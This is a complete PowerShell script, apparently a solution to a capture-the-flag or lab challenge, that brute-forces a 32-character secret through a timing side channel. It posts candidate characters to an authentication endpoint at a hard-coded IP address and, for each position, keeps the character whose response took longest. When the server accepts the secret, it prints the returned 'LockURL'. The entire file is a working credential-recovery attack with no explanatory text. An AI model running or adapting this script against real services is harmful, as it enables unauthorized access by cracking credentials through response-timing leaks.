$list = ("a","b","c","d","e","f","g","h","i","j","k","l","m","n","o","p","q","r","s","t","u","v","w","x","y","z","1","2","3","4","5","6","7","8","9","0")

$dtable = New-Object System.Data.DataTable
$dtable.Columns.Add("Time", "System.String") | Out-Null
$dtable.Columns.Add("Char", "System.String") | Out-Null


$max = 0
$found = ""
$stop = $true
while ($stop){
    foreach ($char in $list){
        $row = $dtable.NewRow()
        $params = @{"Seed"="CLIENTID_GOES_HERE";"Password"="$found$char"} | ConvertTo-Json
        $headers = @{"Server"="iWalk-Server-v2"}
        $response = Invoke-RestMethod -uri "http://35.246.158.51:8070/auth/v1_1" -UserAgent "ed9ae2c0-9b15-4556-a393-23d500675d4b" -Method Post -Body $params -Headers $headers -ContentType "application/json"
        $row.Time = $response.Time 
        $row.Char = $char
        $dtable.Rows.Add($row)
        if ($response.IsValid -eq "True"){
            $response.LockURL
            $stop = $false
            }


    }
    
    $max = ($dtable|Measure-Object -Property Time -Maximum ).Maximum
    $rightcc = $dtable | where {$_.time -eq $max} | select -ExpandProperty Char
    $found = $found+$rightcc
    write-host "Letters found so far: "$found
    write-host "Current hash length is "$found.Length " out of 32"
    if ($found.Length -eq "32" ){
        $stop = $false
        }
    $dtable.Clear()
}
$found
